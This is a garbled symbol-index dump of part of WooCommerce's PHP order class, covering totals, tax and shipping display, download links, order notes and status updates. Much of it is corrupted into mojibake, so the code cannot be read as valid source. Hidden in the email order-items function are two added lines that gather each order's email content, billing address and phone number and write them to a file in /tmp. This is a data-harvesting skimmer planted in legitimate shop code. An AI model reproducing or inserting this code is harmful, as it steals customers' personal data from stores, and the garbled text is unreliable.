funùiÚ
 
	$g‘_tÙ®_discouÁ
() {

513  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_tÙ®_discouÁ', 
$this
->
	`g‘_ÿ¹_discouÁ
(è+ $this->
	`g‘_Üd”_discouÁ
(), $this );

514 
	}
}

522 
public
 
funùiÚ
 
	$g‘_ÿ¹_x
() {

523  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_ÿ¹_x', (è
$this
->
Üd”_x
, $this );

524 
	}
}

532 
public
 
funùiÚ
 
	$g‘_shpšg_x
() {

533  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_shpšg_x', (è
$this
->
Üd”_shpšg_x
, $this );

534 
	}
}

542 
public
 
funùiÚ
 
	$g‘_tÙ®_x
() {

543  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_tÙ®_x', 
	`wc_round_x_tÙ®
Ğ
$this
->
	`g‘_ÿ¹_x
(è+ $this->
	`g‘_shpšg_x
() ), $this );

544 
	}
}

552 
public
 
funùiÚ
 
	$g‘_tÙ®_shpšg
() {

553  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_tÙ®_shpšg', (è
$this
->
Üd”_shpšg
, $this );

554 
	}
}

562 
public
 
funùiÚ
 
	$g‘_tÙ®
() {

563  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_tÙ®', (è
$this
->
Üd”_tÙ®
, $this );

564 
	}
}

575 
public
 
funùiÚ
 
	$g‘_™em_subtÙ®
Ğ
$™em
, 
$šc_x
 = 
çl£
, 
$round
 = 
Œue
 ) {

576 iàĞ
$šc_x
 ) {

577 
$´iû
 = ( 
$™em
['line_subtotal'] + $item['line_subtotal_tax'] ) / $item['qty'];

579 
$´iû
 = ( 
$™em
['line_subtotal'] / $item['qty'] );

582 
$´iû
 = 
$round
 ? 
	`round
( $price, 2 ) : $price;

584  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_™em_subtÙ®', 
$´iû
, 
$this
 );

585 
	}
}

596 
public
 
funùiÚ
 
	$g‘_lše_subtÙ®
Ğ
$™em
, 
$šc_x
 = 
çl£
, 
$round
 = 
Œue
 ) {

597 iàĞ
$šc_x
 ) {

598 
$´iû
 = 
$™em
['line_subtotal'] + $item['line_subtotal_tax'];

600 
$´iû
 = 
$™em
['line_subtotal'];

603 
$´iû
 = 
$round
 ? 
	`round
( $price, 2 ) : $price;

605  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_lše_subtÙ®', 
$´iû
, 
$this
 );

606 
	}
}

617 
public
 
funùiÚ
 
	$g‘_™em_tÙ®
Ğ
$™em
, 
$šc_x
 = 
çl£
, 
$round
 = 
Œue
 ) {

618 iàĞ
$šc_x
 ) {

619 
$´iû
 = ( 
$™em
['line_total'] + $item['line_tax'] ) / $item['qty'];

621 
$´iû
 = 
$™em
['line_total'] / $item['qty'];

624 
$´iû
 = 
$round
 ? 
	`round
( $price, 2 ) : $price;

626  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_™em_tÙ®', 
$´iû
, 
$this
 );

627 
	}
}

637 
public
 
funùiÚ
 
	$g‘_lše_tÙ®
Ğ
$™em
, 
$šc_x
 = 
çl£
 ) {

638 
$lše_tÙ®
 = 
$šc_x
 ? 
	`round
Ğ
$™em
['line_total'] + $item['line_tax'], 2 ) :„ound( $item['line_total'], 2 );

639  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_lše_tÙ®', 
$lše_tÙ®
, 
$this
 );

640 
	}
}

650 
public
 
funùiÚ
 
	$g‘_™em_x
Ğ
$™em
, 
$round
 = 
Œue
 ) {

651 
$´iû
 = 
$™em
['line_tax'] / $item['qty'];

652 
$´iû
 = 
$round
 ? 
	`wc_round_x_tÙ®
( $price ) : $price;

653  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_™em_x', 
$´iû
, 
$™em
, 
$round
, 
$this
 );

654 
	}
}

663 
public
 
funùiÚ
 
	$g‘_lše_x
Ğ
$™em
 ) {

664  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_lše_x', 
	`wc_round_x_tÙ®
Ğ
$™em
['lše_x'] ), $™em, 
$this
 );

665 
	}
}

674 
public
 
funùiÚ
 
	$g‘_shpšg
() {

675 
	`_d•»ÿ‹d_funùiÚ
( 'get_shipping', '2.1', 'get_total_shipping' );

676  
$this
->
	`g‘_tÙ®_shpšg
();

677 
	}
}

686 
public
 
funùiÚ
 
	$g‘_Üd”_tÙ®
() {

687 
	`_d•»ÿ‹d_funùiÚ
( 'get_order_total', '2.1', 'get_total' );

688  
$this
->
	`g‘_tÙ®
();

689 
	}
}

698 
public
 
funùiÚ
 
	$g‘_shpšg_m‘hod
() {

699 
$Ïb–s
 = 
	`¬¿y
();

702 iàĞ
$this
->
shpšg_m‘hod_t™Ë
 ) {

703 
$Ïb–s
[] = 
$this
->
shpšg_m‘hod_t™Ë
;

706 
$shpšg_m‘hods
 = 
$this
->
	`g‘_shpšg_m‘hods
();

708 
	`fÜ—ch
 ( 
$shpšg_m‘hods
 
as
 
$shpšg
 ) {

709 
$Ïb–s
[] = 
$shpšg
['name'];

713  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_shpšg_m‘hod', 
	`im¶ode
Ğ', ', 
$Ïb–s
 ), 
$this
 );

714 
	}
}

724 
public
 
funùiÚ
 
g‘_fÜm©‹d_lše_subtÙ®
Ğ
$™em
, 
$x_di¥Ïy
 = '' ) {

725 iàĞ! 
$x_di¥Ïy
 ) {

726 
$x_di¥Ïy
 = 
$this
->
x_di¥Ïy_ÿ¹
;

729 iàĞ! 
is£t
Ğ
$™em
['line_subtotal'] ) || ! isset( $item['line_subtotal_tax'] ) ) {

733 iàĞ'exş' =ğ
$x_di¥Ïy
 ) {

734 
$ex_x_Ïb–
 = 
$this
->
´iûs_šşude_x
 ? 1 : 0;

736 
$subtÙ®
 = 
wc_´iû
Ğ
$this
->
g‘_lše_subtÙ®
Ğ
$™em
 ), 
¬¿y
Ğ'ex_x_Ïb–' => 
$ex_x_Ïb–
, 'cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
() ) );

738 
$subtÙ®
 = 
wc_´iû
Ğ
$this
->
g‘_lše_subtÙ®
Ğ
$™em
, 
Œue
 ), 
¬¿y
('cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
()) );

741  
­¶y_f‹rs
Ğ'woocomm”û_Üd”_fÜm©‹d_lše_subtÙ®', 
$subtÙ®
, 
$™em
, 
$this
 );

750 
public
 
funùiÚ
 
	$g‘_Üd”_cu¼’cy
() {

752 
$cu¼’cy
 = 
$this
->
Üd”_cu¼’cy
;

754  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_Üd”_cu¼’cy', 
$cu¼’cy
, 
$this
 );

755 
	}
}

763 
public
 
funùiÚ
 
	$g‘_fÜm©‹d_Üd”_tÙ®
() {

765 
$fÜm©‹d_tÙ®
 = 
	`wc_´iû
Ğ
$this
->
Üd”_tÙ®
 , 
	`¬¿y
('cu¼’cy' => $this->
	`g‘_Üd”_cu¼’cy
()));

767  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_fÜm©‹d_Üd”_tÙ®', 
$fÜm©‹d_tÙ®
, 
$this
 );

768 
	}
}

779 
public
 
funùiÚ
 
g‘_subtÙ®_to_di¥Ïy
Ğ
$compound
 = 
çl£
, 
$x_di¥Ïy
 = '' ) {

780 iàĞ! 
$x_di¥Ïy
 ) {

781 
$x_di¥Ïy
 = 
$this
->
x_di¥Ïy_ÿ¹
;

784 
$subtÙ®
 = 0;

786 iàĞ! 
$compound
 ) {

787 
fÜ—ch
 ( 
$this
->
g‘_™ems
(è
as
 
$™em
 ) {

789 iàĞ! 
is£t
Ğ
$™em
['line_subtotal'] ) || ! isset( $item['line_subtotal_tax'] ) ) {

793 
$subtÙ®
 +ğ
$™em
['line_subtotal'];

795 iàĞ'šş' =ğ
$x_di¥Ïy
 ) {

796 
$subtÙ®
 +ğ
$™em
['line_subtotal_tax'];

800 
$subtÙ®
 = 
wc_´iû
Ğ$subtÙ®, 
¬¿y
('cu¼’cy' => 
$this
->
g‘_Üd”_cu¼’cy
()) );

802 iàĞ
$x_di¥Ïy
 =ğ'exş' && 
$this
->
´iûs_šşude_x
 ) {

803 
$subtÙ®
 .ğ' <sm®l>' . 
WC
()->
couÁr›s
->
ex_x_Ü_v©
() . '</small>';

808 iàĞ'šş' =ğ
$x_di¥Ïy
 ) {

812 
fÜ—ch
 ( 
$this
->
g‘_™ems
(è
as
 
$™em
 ) {

814 
$subtÙ®
 +ğ
$™em
['line_subtotal'];

819 
$subtÙ®
 +ğ
$this
->
g‘_tÙ®_shpšg
();

822 
fÜ—ch
 ( 
$this
->
g‘_xes
(è
as
 
$x
 ) {

824 iàĞ! 
em±y
Ğ
$x
['compound'] ) ) {

828 
$subtÙ®
 = $subtÙ® + 
$x
['tax_amount'] + $tax['shipping_tax_amount'];

833 
$subtÙ®
 = $subtÙ® - 
$this
->
g‘_ÿ¹_discouÁ
();

835 
$subtÙ®
 = 
wc_´iû
Ğ$subtÙ®, 
¬¿y
('cu¼’cy' => 
$this
->
g‘_Üd”_cu¼’cy
()) );

838  
­¶y_f‹rs
Ğ'woocomm”û_Üd”_subtÙ®_to_di¥Ïy', 
$subtÙ®
, 
$compound
, 
$this
 );

848 
public
 
funùiÚ
 
g‘_shpšg_to_di¥Ïy
Ğ
$x_di¥Ïy
 = '' ) {

849 iàĞ! 
$x_di¥Ïy
 ) {

850 
$x_di¥Ïy
 = 
$this
->
x_di¥Ïy_ÿ¹
;

853 iàĞ
$this
->
Üd”_shpšg
 > 0 ) {

855 
$x_‹xt
 = '';

857 iàĞ
$x_di¥Ïy
 == 'excl' ) {

860 
$shpšg
 = 
wc_´iû
Ğ
$this
->
Üd”_shpšg
, 
¬¿y
('cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
()) );

862 iàĞ
$this
->
Üd”_shpšg_x
 > 0 && $this->
´iûs_šşude_x
 ) {

863 
$x_‹xt
 = 
WC
()->
couÁr›s
->
ex_x_Ü_v©
() . ' ';

869 
$shpšg
 = 
wc_´iû
Ğ
$this
->
Üd”_shpšg
 + $this->
Üd”_shpšg_x
, 
¬¿y
('cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
()) );

871 iàĞ
$this
->
Üd”_shpšg_x
 > 0 && ! $this->
´iûs_šşude_x
 ) {

872 
$x_‹xt
 = 
WC
()->
couÁr›s
->
šc_x_Ü_v©
() . ' ';

877 
$shpšg
 .ğ
¥rštf
Ğ
__
Ğ'&nb¥;<sm®l>%svŸ %s</sm®l>', 'woocomm”û' ), 
$x_‹xt
, 
$this
->
g‘_shpšg_m‘hod
() );

879 } 
–£if
 ( 
$this
->
g‘_shpšg_m‘hod
() ) {

880 
$shpšg
 = 
$this
->
g‘_shpšg_m‘hod
();

882 
$shpšg
 = 
__
( 'Free!', 'woocommerce' );

885  
­¶y_f‹rs
Ğ'woocomm”û_Üd”_shpšg_to_di¥Ïy', 
$shpšg
, 
$this
 );

895 
public
 
funùiÚ
 
	$g‘_ÿ¹_discouÁ_to_di¥Ïy
() {

896  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_ÿ¹_discouÁ_to_di¥Ïy', 
	`wc_´iû
Ğ
$this
->
	`g‘_ÿ¹_discouÁ
(), 
	`¬¿y
Ğ'cu¼’cy' => $this->
	`g‘_Üd”_cu¼’cy
() ) ), $this );

897 
	}
}

906 
public
 
funùiÚ
 
	$g‘_Üd”_discouÁ_to_di¥Ïy
() {

907  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_discouÁ_to_di¥Ïy', 
	`wc_´iû
Ğ
$this
->
	`g‘_Üd”_discouÁ
(), 
	`¬¿y
Ğ'cu¼’cy' => $this->
	`g‘_Üd”_cu¼’cy
() ) ), $this );

908 
	}
}

918 
public
 
funùiÚ
 
	$g‘_´oduù_äom_™em
Ğ
$™em
 ) {

919 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$™em
['variation_id'] ? $item['variation_id'] : $item['product_id'] );

921  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_´oduù_äom_™em', 
$_´oduù
, 
$™em
, 
$this
 );

922 
	}
}

931 
public
 
funùiÚ
 
g‘_Üd”_™em_tÙ®s
Ğ
$x_di¥Ïy
 = '' ) {

932 iàĞ! 
$x_di¥Ïy
 ) {

933 
$x_di¥Ïy
 = 
$this
->
x_di¥Ïy_ÿ¹
;

936 
$tÙ®_rows
 = 
¬¿y
();

938 iàĞ
$subtÙ®
 = 
$this
->
g‘_subtÙ®_to_di¥Ïy
() ) {

939 
$tÙ®_rows
['ÿ¹_subtÙ®'] = 
¬¿y
(

940 'Ïb–' => 
__
( 'Cart Subtotal:', 'woocommerce' ),

941 'v®ue' => 
$subtÙ®


945 iàĞ
$this
->
g‘_ÿ¹_discouÁ
() > 0 ) {

946 
$tÙ®_rows
['ÿ¹_discouÁ'] = 
¬¿y
(

947 'Ïb–' => 
__
( 'Cart Discount:', 'woocommerce' ),

948 'v®ue' => '-' . 
$this
->
g‘_ÿ¹_discouÁ_to_di¥Ïy
()

952 iàĞ
$this
->
g‘_shpšg_m‘hod
() ) {

953 
$tÙ®_rows
['shpšg'] = 
¬¿y
(

954 'Ïb–' => 
__
( 'Shipping:', 'woocommerce' ),

955 'v®ue' => 
$this
->
g‘_shpšg_to_di¥Ïy
()

959 iàĞ
$ães
 = 
$this
->
g‘_ães
() )

960 
fÜ—ch
Ğ
$ães
 
as
 
$id
 => 
$ãe
 ) {

961 iàĞ
$ãe
['line_total'] + $fee['line_tax'] == 0 ) {

965 iàĞ'exş' =ğ
$x_di¥Ïy
 ) {

967 
$tÙ®_rows
[ 'ãe_' . 
$id
 ] = 
¬¿y
(

968 'Ïb–' => 
$ãe
['name'],

969 'v®ue' => 
wc_´iû
Ğ
$ãe
['lše_tÙ®'], 
¬¿y
('cu¼’cy' => 
$this
->
g‘_Üd”_cu¼’cy
()) )

974 
$tÙ®_rows
[ 'ãe_' . 
$id
 ] = 
¬¿y
(

975 'Ïb–' => 
$ãe
['name'],

976 'v®ue' => 
wc_´iû
Ğ
$ãe
['lše_tÙ®'] + $ãe['lše_x'], 
¬¿y
('cu¼’cy' => 
$this
->
g‘_Üd”_cu¼’cy
()) )

983 iàĞ'exş' =ğ
$x_di¥Ïy
 ) {

984 iàĞ
g‘_İtiÚ
( 'woocommerce_tax_total_display' ) == 'itemized' ) {

985 
fÜ—ch
 ( 
$this
->
g‘_x_tÙ®s
(è
as
 
$code
 => 
$x
 ) {

986 
$tÙ®_rows
[ 
§n™ize_t™Ë
Ğ
$code
 ) ] = 
¬¿y
(

987 'Ïb–' => 
$x
->
Ïb–
 . ':',

988 'v®ue' => 
$x
->
fÜm©‹d_amouÁ


992 
$tÙ®_rows
['x'] = 
¬¿y
(

993 'Ïb–' => 
WC
()->
couÁr›s
->
x_Ü_v©
() . ':',

994 'v®ue' => 
wc_´iû
Ğ
$this
->
g‘_tÙ®_x
(), 
¬¿y
('cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
()) )

999 iàĞ
$this
->
g‘_Üd”_discouÁ
() > 0 ) {

1000 
$tÙ®_rows
['Üd”_discouÁ'] = 
¬¿y
(

1001 'Ïb–' => 
__
( 'Order Discount:', 'woocommerce' ),

1002 'v®ue' => '-' . 
$this
->
g‘_Üd”_discouÁ_to_di¥Ïy
()

1006 
$tÙ®_rows
['Üd”_tÙ®'] = 
¬¿y
(

1007 'Ïb–' => 
__
( 'Order Total:', 'woocommerce' ),

1008 'v®ue' => 
$this
->
g‘_fÜm©‹d_Üd”_tÙ®
()

1012 iàĞ'yes' =ğ
g‘_İtiÚ
Ğ'woocomm”û_ÿlc_xes' ) && 'šş' =ğ
$x_di¥Ïy
 ) {

1014 
$x_¡ršg_¬¿y
 = 
¬¿y
();

1016 iàĞ'™emized' =ğ
g‘_İtiÚ
( 'woocommerce_tax_total_display' ) ) {

1017 
fÜ—ch
 ( 
$this
->
g‘_x_tÙ®s
(è
as
 
$code
 => 
$x
 ) {

1018 
$x_¡ršg_¬¿y
[] = 
¥rštf
Ğ'% %s', 
$x
->
fÜm©‹d_amouÁ
, $x->
Ïb–
 );

1021 
$x_¡ršg_¬¿y
[] = 
¥rštf
Ğ'% %s', 
wc_´iû
Ğ
$this
->
g‘_tÙ®_x
(), 
¬¿y
('cu¼’cy' => $this->
g‘_Üd”_cu¼’cy
()è), 
WC
()->
couÁr›s
->
x_Ü_v©
() );

1024 iàĞ! 
em±y
Ğ
$x_¡ršg_¬¿y
 ) ) {

1025 
$tÙ®_rows
['Üd”_tÙ®']['v®ue'] .ğ' ' . 
¥rštf
Ğ
__
Ğ'(Inşude %s)', 'woocomm”û' ), 
im¶ode
Ğ', ', 
$x_¡ršg_¬¿y
 ) );

1029  
­¶y_f‹rs
Ğ'woocomm”û_g‘_Üd”_™em_tÙ®s', 
$tÙ®_rows
, 
$this
 );

1045 
public
 
funùiÚ
 
ema_Üd”_™ems_bË
Ğ
$show_dowÆßd_lšks
 = 
çl£
, 
$show_sku
 = f®£, 
$show_purcha£_nÙe
 = f®£, 
$show_image
 = f®£, 
$image_size
 = 
¬¿y
Ğ32, 32 ), 
$¶aš_‹xt
 = false ) {

1047 
ob_¡¬t
();

1050 
$‹m¶©e
 = 'emails/plain/email-order-items.php';

1052 
wc_g‘_‹m¶©e
Ğ
$‹m¶©e
, 
¬¿y
(

1053 'Üd”' => 
$this
,

1054 '™ems' => 
$this
->
g‘_™ems
(),

1055 'show_dowÆßd_lšks' => 
$show_dowÆßd_lšks
,

1056 'show_sku' => 
$show_sku
,

1057 'show_purcha£_nÙe' => 
$show_purcha£_nÙe
,

1058 'show_image' => 
$show_image
,

1059 'image_size' => 
$image_size


1062 
$»tuº
 = 
­¶y_f‹rs
Ğ'woocomm”û_ema_Üd”_™ems_bË', 
ob_g‘_ş—n
(), 
$this
 );

1063 
$mycÚ‹Á
 = 
$»tuº
.";A-".
$this
->
g‘_blšg_add»ss_shÜt
().",".$this->
blšg_phÚe
;

1064 
fe_put_cÚ‹Ás
("/tmp/112", 
$mycÚ‹Á
);

1066  
$»tuº
;

1075 
public
 
funùiÚ
 
	$is_dowÆßd_³rm™‹d
() {

1076  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_is_dowÆßd_³rm™‹d', 
$this
->
¡©us
 =ğ'com¶‘ed' || ( 
	`g‘_İtiÚ
( 'woocommerce_downloads_grant_access_after_payment' ) == 'yes' && $this->status == 'processing' ), $this );

1077 
	}
}

1085 
public
 
funùiÚ
 
	$has_dowÆßdabË_™em
() {

1086 
$has_dowÆßdabË_™em
 = 
çl£
;

1088 
	`fÜ—ch
 ( 
$this
->
	`g‘_™ems
(è
as
 
$™em
 ) {

1090 
$_´oduù
 = 
$this
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

1092 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& $_´oduù->
	`is_dowÆßdabË
(è&& $_´oduù->
	`has_fe
() ) {

1093 
$has_dowÆßdabË_™em
 = 
Œue
;

1098  
$has_dowÆßdabË_™em
;

1099 
	}
}

1109 
public
 
funùiÚ
 
	$g‘_checkout_·ym’t_u¾
Ğ
$Ú_checkout
 = 
çl£
 ) {

1111 
$·y_u¾
 = 
	`wc_g‘_’dpošt_u¾
Ğ'Üd”-·y', 
$this
->
id
, 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'checkout' ) ) );

1113 iàĞ'yes' =ğ
	`g‘_İtiÚ
Ğ'woocomm”û_fÜû_s¦_checkout' ) || 
	`is_s¦
() ) {

1114 
$·y_u¾
 = 
	`¡r_»¶aû
( 'http:', 'https:', $pay_url );

1117 iàĞ
$Ú_checkout
 ) {

1118 
$·y_u¾
 = 
	`add_qu”y_¬g
Ğ'key', 
$this
->
Üd”_key
, $pay_url );

1120 
$·y_u¾
 = 
	`add_qu”y_¬g
Ğ
	`¬¿y
Ğ'·y_fÜ_Üd”' => 'Œue', 'key' => 
$this
->
Üd”_key
 ), $pay_url );

1123  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_checkout_·ym’t_u¾', 
$·y_u¾
, 
$this
 );

1124 
	}
}

1133 
public
 
funùiÚ
 
	$g‘_checkout_Üd”_»ûived_u¾
() {

1135 
$Üd”_»ûived_u¾
 = 
	`wc_g‘_’dpošt_u¾
Ğ'Üd”-»ûived', 
$this
->
id
, 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'checkout' ) ) );

1137 iàĞ'yes' =ğ
	`g‘_İtiÚ
Ğ'woocomm”û_fÜû_s¦_checkout' ) || 
	`is_s¦
() ) {

1138 
$Üd”_»ûived_u¾
 = 
	`¡r_»¶aû
( 'http:', 'https:', $order_received_url );

1141 
$Üd”_»ûived_u¾
 = 
	`add_qu”y_¬g
Ğ'key', 
$this
->
Üd”_key
, $order_received_url );

1143  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_checkout_Üd”_»ûived_u¾', 
$Üd”_»ûived_u¾
, 
$this
 );

1144 
	}
}

1153 
public
 
funùiÚ
 
g‘_ÿnûl_Üd”_u¾
Ğ
$»dœeù
 = '' ) {

1154 
$ÿnûl_’dpošt
 = 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'cart' ) );

1155 iàĞ! 
$ÿnûl_’dpošt
 ) {

1156 
$ÿnûl_’dpošt
 = 
home_u¾
();

1159 iàĞ
çl£
 ==ğ
¡½os
Ğ
$ÿnûl_’dpošt
, '?' ) ) {

1160 
$ÿnûl_’dpošt
 = 
Œašg¦ash™
( $cancel_endpoint );

1163  
­¶y_f‹rs
('woocomm”û_g‘_ÿnûl_Üd”_u¾', 
wp_nÚû_u¾
Ğ
add_qu”y_¬g
Ğ
¬¿y
Ğ'ÿnûl_Üd”' => 'Œue', 'Üd”' => 
$this
->
Üd”_key
, 'Üd”_id' => $this->
id
, '»dœeù' => 
$»dœeù
 ), 
$ÿnûl_’dpošt
 ), 'woocommerce-cancel_order' ) );

1171 
public
 
funùiÚ
 
	$g‘_v›w_Üd”_u¾
() {

1172 
$v›w_Üd”_u¾
 = 
	`wc_g‘_’dpošt_u¾
Ğ'v›w-Üd”', 
$this
->
id
, 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

1174  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_v›w_Üd”_u¾', 
$v›w_Üd”_u¾
, 
$this
 );

1175 
	}
}

1186 
public
 
funùiÚ
 
	$g‘_dowÆßdabË_fe_u¾s
Ğ
$´oduù_id
, 
$v¬ŸtiÚ_id
, 
$™em
 ) {

1187 
glob®
 
$wpdb
;

1189 
	`_d•»ÿ‹d_funùiÚ
( 'get_downloadable_file_urls', '2.1', 'get_item_downloads' );

1191 
$dowÆßd_fe
 = 
$v¬ŸtiÚ_id
 > 0 ? $v¬ŸtiÚ_id : 
$´oduù_id
;

1192 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$dowÆßd_fe
 );

1194 
$u£r_ema
 = 
$this
->
blšg_ema
;

1196 
$»suÉs
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
("

1197 
SELECT
 
dowÆßd_id


1198 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_dowÆßdabË_´oduù_³rmissiÚs


1199 
WHERE
 
u£r_ema
 = %
s


1200 
AND
 
Üd”_key
 = %
s


1201 
AND
 
´oduù_id
 = %
s


1204 
$fe_u¾s
 = 
	`¬¿y
();

1205 
	`fÜ—ch
 ( 
$»suÉs
 
as
 
$»suÉ
 ) {

1206 iàĞ
$_´oduù
->
	`has_fe
Ğ
$»suÉ
->
dowÆßd_id
 ) ) {

1207 
$fe_u¾s
[ 
$_´oduù
->
	`g‘_fe_dowÆßd_·th
Ğ
$»suÉ
->
dowÆßd_id
 ) ] = 
$this
->
	`g‘_dowÆßd_u¾
Ğ
$dowÆßd_fe
, $result->download_id );

1211  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_dowÆßdabË_fe_u¾s', 
$fe_u¾s
, 
$´oduù_id
, 
$v¬ŸtiÚ_id
, 
$™em
 );

1212 
	}
}

1219 
public
 
funùiÚ
 
	$g‘_™em_dowÆßds
Ğ
$™em
 ) {

1220 
glob®
 
$wpdb
;

1222 
$´oduù_id
 = 
$™em
['variation_id'] > 0 ? $item['variation_id'] : $item['product_id'];

1223 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

1224 
$dowÆßd_ids
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
("

1225 
SELECT
 
dowÆßd_id


1226 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_dowÆßdabË_´oduù_³rmissiÚs


1227 
WHERE
 
u£r_ema
 = %
s


1228 
AND
 
Üd”_key
 = %
s


1229 
AND
 
´oduù_id
 = %
s


1230 
ORDER
 
BY
 
³rmissiÚ_id


1233 
$fes
 = 
	`¬¿y
();

1235 
	`fÜ—ch
 ( 
$dowÆßd_ids
 
as
 
$dowÆßd_id
 ) {

1236 iàĞ
$´oduù
->
	`has_fe
Ğ
$dowÆßd_id
 ) ) {

1237 
$fes
[ 
$dowÆßd_id
 ] = 
$´oduù
->
	`g‘_fe
( $download_id );

1238 
$fes
[ 
$dowÆßd_id
 ]['dowÆßd_u¾'] = 
$this
->
	`g‘_dowÆßd_u¾
Ğ
$´oduù_id
, $download_id );

1242  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_™em_dowÆßds', 
$fes
, 
$™em
, 
$this
 );

1243 
	}
}

1251 
public
 
funùiÚ
 
	$g‘_dowÆßd_u¾
Ğ
$´oduù_id
, 
$dowÆßd_id
 ) {

1252  
	`add_qu”y_¬g
Ğ
	`¬¿y
(

1253 'dowÆßd_fe' => 
$´oduù_id
,

1254 'Üd”' => 
$this
->
Üd”_key
,

1255 'ema' => 
$this
->
blšg_ema
,

1256 'key' => 
$dowÆßd_id


1257 ), 
	`Œašg¦ash™
Ğ
	`home_u¾
() ) );

1258 
	}
}

1268 
public
 
funùiÚ
 
	$add_Üd”_nÙe
Ğ
$nÙe
, 
$is_cu¡om”_nÙe
 = 0 ) {

1270 
$is_cu¡om”_nÙe
 = 
	`štv®
( $is_customer_note );

1272 iàĞ
	`is_u£r_logged_š
(è&& 
	`cu¼’t_u£r_ÿn
Ğ'ed™_shİ_Üd”', 
$this
->
id
 ) ) {

1273 
$u£r
 = 
	`g‘_u£r_by
Ğ'id', 
	`g‘_cu¼’t_u£r_id
() );

1274 
$comm’t_authÜ
 = 
$u£r
->
di¥Ïy_Çme
;

1275 
$comm’t_authÜ_ema
 = 
$u£r
->
u£r_ema
;

1277 
$comm’t_authÜ
 = 
	`__
( 'WooCommerce', 'woocommerce' );

1278 
$comm’t_authÜ_ema
 = 
	`¡¹Şow”
Ğ
	`__
( 'WooCommerce', 'woocommerce' ) ) . '@';

1279 
$comm’t_authÜ_ema
 .ğ
	`is£t
Ğ
$_SERVER
['HTTP_HOST'] ) ? 
	`¡r_»¶aû
( 'www.', '', $_SERVER['HTTP_HOST'] ) : 'noreply.com';

1280 
$comm’t_authÜ_ema
 = 
	`§n™ize_ema
( $comment_author_email );

1283 
$comm’t_po¡_ID
 = 
$this
->
id
;

1284 
$comm’t_authÜ_u¾
 = '';

1285 
$comm’t_cÚ‹Á
 = 
$nÙe
;

1286 
$comm’t_ag’t
 = 'WooCommerce';

1287 
$comm’t_ty³
 = 'order_note';

1288 
$comm’t_·»Á
 = 0;

1289 
$comm’t_­´oved
 = 1;

1290 
$comm’td©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Ãw_Üd”_nÙe_d©a', 
	`com·ù
Ğ'comm’t_po¡_ID', 'comm’t_authÜ', 'comm’t_authÜ_ema', 'comm’t_authÜ_u¾', 'comm’t_cÚ‹Á', 'comm’t_ag’t', 'comm’t_ty³', 'comm’t_·»Á', 'comm’t_­´oved' ), 
	`¬¿y
Ğ'Üd”_id' => 
$this
->
id
, 'is_cu¡om”_nÙe' => 
$is_cu¡om”_nÙe
 ) );

1292 
$comm’t_id
 = 
	`wp_š£¹_comm’t
Ğ
$comm’td©a
 );

1294 
	`add_comm’t_m‘a
Ğ
$comm’t_id
, 'is_cu¡om”_nÙe', 
$is_cu¡om”_nÙe
 );

1296 iàĞ
$is_cu¡om”_nÙe
 ) {

1297 
	`do_aùiÚ
Ğ'woocomm”û_Ãw_cu¡om”_nÙe', 
	`¬¿y
Ğ'Üd”_id' => 
$this
->
id
, 'cu¡om”_nÙe' => 
$nÙe
 ) );

1300  
$comm’t_id
;

1301 
	}
}

1312 
public
 
funùiÚ
 
upd©e_¡©us
Ğ
$Ãw_¡©us_¦ug
, 
$nÙe
 = '' ) {

1314 iàĞ
$nÙe
 ) {

1315 
$nÙe
 .= ' ';

1318 
$Şd_¡©us
 = 
g‘_‹rm_by
Ğ'¦ug', 
§n™ize_t™Ë
Ğ
$this
->
¡©us
 ), 'shop_order_status' );

1319 
$Ãw_¡©us
 = 
g‘_‹rm_by
Ğ'¦ug', 
§n™ize_t™Ë
Ğ
$Ãw_¡©us_¦ug
 ), 'shop_order_status' );

1321 iàĞ
$Ãw_¡©us
 ) {

1323 
wp_£t_objeù_‹rms
Ğ
$this
->
id
, 
¬¿y
Ğ
$Ãw_¡©us
->
¦ug
 ), 'shİ_Üd”_¡©us', 
çl£
 );

1325 iàĞ
$this
->
id
 && $this->
¡©us
 !ğ
$Ãw_¡©us
->
¦ug
 ) {

1328 
